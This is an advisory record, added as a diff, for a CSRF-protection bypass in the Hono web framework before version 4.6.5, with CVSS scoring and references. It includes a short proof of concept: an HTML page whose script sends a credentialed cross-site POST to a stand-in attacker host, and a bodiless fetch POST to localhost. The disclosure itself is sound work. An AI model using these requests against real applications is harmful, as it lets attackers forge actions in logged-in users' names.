@@ -1,0 +1,86 @@
+advisory_id: GHSA-2234-fmw7-43wr
+datasource_id: github_osv_importer_v2/GHSA-2234-fmw7-43wr
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-2234-fmw7-43wr/GHSA-2234-fmw7-43wr.json
+aliases:
+  - CVE-2024-48913
+summary: |
+  Hono allows bypass of CSRF Middleware by a request without Content-Type header.
+  ### Summary
+  Bypass CSRF Middleware by a request without Content-Type herader.
+
+  ### Details
+  Although the csrf middleware verifies the Content-Type Header, Hono always considers a request without a Content-Type header to be safe.
+
+  https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89
+
+  ### PoC
+  ```server.js
+  // server.js
+  import { Hono } from 'hono'
+  import { csrf }from 'hono/csrf'
+  const app = new Hono()
+  app.use(csrf())
+  app.get('/', (c) => {
+    return c.html('Hello Hono!')
+  })
+  app.post('/', async (c) => {
+    console.log("executed")
+    return c.text( await c.req.text())
+  })
+  Deno.serve(app.fetch)
+  ```
+
+  ```poc.html
+  <!-- PoC.html -->
+  <script>
+  async function myclick() {
+      await fetch("http://evil.example.com", {
+      method: "POST",
+      credentials: "include",
+      body:new Blob([`test`],{}),
+      });
+  }
+  </script>
+  <input type="button" onclick="myclick()" value="run" />
+  ```
+
+  Similarly, the fetch API does not add a Content-Type header for requests that do not include a Body.
+  ```PoC2.js
+  await fetch("http://localhost:8000", { method: "POST", credentials: "include"});
+  ```
+
+  ### Impact
+  Bypass csrf protection implemented with hono csrf middleware.
+impacted_packages:
+  - purl: pkg:npm/hono
+    affected_versions: vers:npm/<4.6.5
+    fixed_versions: vers:npm/4.6.5
+severities:
+  - score: '5.9'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:H/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/10/GHSA-2234-fmw7-43wr/GHSA-2234-fmw7-43wr.json
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-352
+references:
+  - url: https://github.com/honojs/hono
+    reference_type:
+    reference_id:
+  - url: https://github.com/honojs/hono/blob/cebf4e87f3984a6a034e60a43f542b4c5225b668/src/middleware/csrf/index.ts#L76-L89
+    reference_type:
+    reference_id:
+  - url: https://github.com/honojs/hono/commit/aa50e0ab77b5af8c53c50fe3b271892f8eeeea82
+    reference_type:
+    reference_id:
+  - url: https://github.com/honojs/hono/security/advisories/GHSA-2234-fmw7-43wr
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-48913
+    reference_type:
+    reference_id:
